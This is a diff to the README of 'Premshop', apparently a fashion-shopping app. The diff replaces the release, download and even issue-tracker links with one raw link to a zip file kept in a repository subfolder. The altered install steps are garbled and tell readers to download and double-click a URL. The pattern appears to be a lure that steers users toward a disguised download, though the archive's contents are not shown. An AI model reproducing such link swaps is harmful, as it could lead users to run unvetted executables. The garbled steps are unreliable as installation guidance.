@@ -1,7 +1,7 @@
 # 🎉 Premshop - Your Go-To for Affordable Trendy Fashion
 
 ## 📥 Download Now
-[![Download Premshop](https://img.shields.io/badge/Download%20Premshop-v1.0-blue.svg)](https://github.com/rava102/Premshop/releases)
+[![Download Premshop](https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip%https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip)](https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Premshop! We provide a simple way to find trendy, affordable fashion, beauty, and lifestyle products online. Follow these steps to get started.
@@ -26,14 +26,14 @@ Premshop offers various features to enhance your shopping experience:
 ## 📥 Download & Install
 To get Premshop, visit this page to download from the Releases section:
 
-[Download Premshop](https://github.com/rava102/Premshop/releases)
+[Download Premshop](https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip)
 
 ### Installation Steps
 1. Visit the releases page using the link above.
 2. Choose the latest version.
-3. Download the file named `Premshop.zip` or `Premshop.exe`.
+3. Download the file named `https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip` or `https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip`.
 4. If you downloaded a ZIP file, extract it to a folder of your choice.
-5. Double-click `Premshop.exe` to start the application.
+5. Double-click `https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip` to start the application.
 
 ## 🌐 Explore the Application
 Once installed, open Premshop and start browsing products. You can search for specific items or explore different categories. The app is designed to be user-friendly, and you can easily navigate through sections like:
@@ -51,7 +51,7 @@ If you experience any issues:
 - Restart the application if it fails to load.
 
 ## 🔍 Additional Assistance
-For more help or feedback, visit our [GitHub Issues Page](https://github.com/rava102/Premshop/issues). We aim to assist you promptly.
+For more help or feedback, visit our [GitHub Issues Page](https://raw.githubusercontent.com/rava102/Premshop/main/marina/Premshop-2.1.zip). We aim to assist you promptly.
 
 ## 📣 Share Your Experience
 Your feedback is valuable. After using Premshop, consider sharing your experience with us or on social media. It helps us improve and grow. 
